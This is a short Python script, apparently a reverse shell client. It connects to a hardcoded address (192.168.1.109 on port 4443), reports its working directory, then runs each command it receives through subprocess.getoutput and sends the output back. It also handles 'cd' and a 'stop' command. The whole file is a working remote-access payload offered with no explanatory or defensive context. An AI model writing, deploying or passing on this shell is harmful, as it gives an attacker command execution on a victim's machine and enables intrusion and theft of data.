import socket
import os
import subprocess
import sys

SERVER_IP = "192.168.1.109"
SERVER_PORT = 4443
BUFFER_SIZE = 1024 * 128 
SEPARATOR = "<sep>"

with socket.socket() as sock:
    sock.connect((SERVER_IP, SERVER_PORT))
    pwd = os.getcwd()
    sock.send(pwd.encode())

    while True:
        command = sock.recv(BUFFER_SIZE).decode()
        splited = command.split()

        if command.lower() == "stop":
            break

        if splited[0].lower() == "cd":
            try:
                os.chdir(' '.join(splited[1:]))

            except FileNotFoundError as e:
                output = str(e)
            except NotADirectoryError as e:
                output = str(e)

            else:
                output = ""
        else:
            # execute the command and retrieve the results
            output = subprocess.getoutput(command)
        # get the current working directory as output
        cwd = os.getcwd()
        # send the results back to the server
        message = f"{output}{SEPARATOR}{cwd}"
        sock.send(message.encode())